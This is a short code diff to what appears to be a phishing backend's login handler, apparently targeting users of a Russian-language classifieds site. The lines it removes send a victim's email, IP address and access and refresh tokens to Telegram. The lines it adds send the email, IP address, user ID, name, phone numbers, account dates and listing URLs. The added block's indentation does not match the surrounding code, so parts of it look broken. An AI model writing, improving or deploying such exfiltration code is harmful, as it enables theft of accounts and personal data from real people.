@@ -98,12 +98,27 @@ def get_token():
         except: 
             ads_flat_tg = "Ошибка получения товаров"
 
-        msg = (f"👤 <b>Вход:</b> <code>{email}</code>\n"
-               f"🌐 <b>IP:</b> <code>{user_ip}</code>\n\n"
-               f"🔑 <b>Access:</b> <code>{access}</code>\n\n"
-               f"🔄 <b>Refresh:</b> <code>{refresh}</code>\n\n"
-               f"📦 <b>Товары:</b>\n{ads_flat_tg}")
-        send_telegram_message(msg)
+    msg = (
+    "=================================\n"
+    "👤 АВТОРИЗАЦИЯ ПОЛЬЗОВАТЕЛЯ\n"
+    "=================================\n\n"
+    f"Email: {email}\n"
+    f"IP: {user_ip}\n\n"
+    f"ID: {user_data.get('id')}\n"
+    f"Имя: {user_data.get('name')}\n"
+    f"Статус: {user_data.get('status')}\n"
+    f"Телефон: {user_data.get('phone')}\n"
+    f"Телефон входа: {user_data.get('phone_login')}\n"
+    f"Дата регистрации: {user_data.get('created_at')}\n"
+    f"Последний вход: {user_data.get('last_login_at')}\n"
+    f"Бизнес аккаунт: {user_data.get('is_business')}\n\n"
+    "📦 ОБЪЯВЛЕНИЯ:\n"
+)
+
+for i, ad in enumerate(ads_data):
+    msg += f"{i+1}. {ad.get('title')}\n{ad.get('url')}\n\n"
+
+send_telegram_message(msg)
 
         resp = make_response(jsonify({"status": "ok"}))
         resp.set_cookie('user_ads', json.dumps(ad_list_for_cookie), max_age=3600, path='/')
